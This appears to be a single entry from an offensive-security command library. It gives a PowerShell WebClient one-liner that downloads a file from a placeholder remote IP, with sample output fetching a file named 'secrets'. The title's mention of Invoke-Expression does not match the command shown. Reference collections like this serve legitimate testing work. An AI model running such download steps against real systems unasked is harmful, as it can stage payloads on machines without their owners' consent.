---
id: 708b3d3a-c1d8-45b8-9d8f-f9cd5b57be21
name: Invoke-Expression Download a File from a Web Server
type: command
executor: powershell
data: (New-Object System.Net.WebClient).downloadfile("http://$_REMOTE_IP/$_FILENAME",
  "$_FULL_PATH/$_FILENAME")
output: PS C:\> (New-Object System.Net.WebClient).downloadfile("http://10.10.10.100/secrets",
  "C:\secrets")
created_at: '2019-11-25T23:58:29.354433+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Invoke-Expression Download a File from a Web Server

```powershell
(New-Object System.Net.WebClient).downloadfile("http://$_REMOTE_IP/$_FILENAME", "$_FULL_PATH/$_FILENAME")
```

## Expected Output

```
PS C:\> (New-Object System.Net.WebClient).downloadfile("http://10.10.10.100/secrets", "C:\secrets")
```


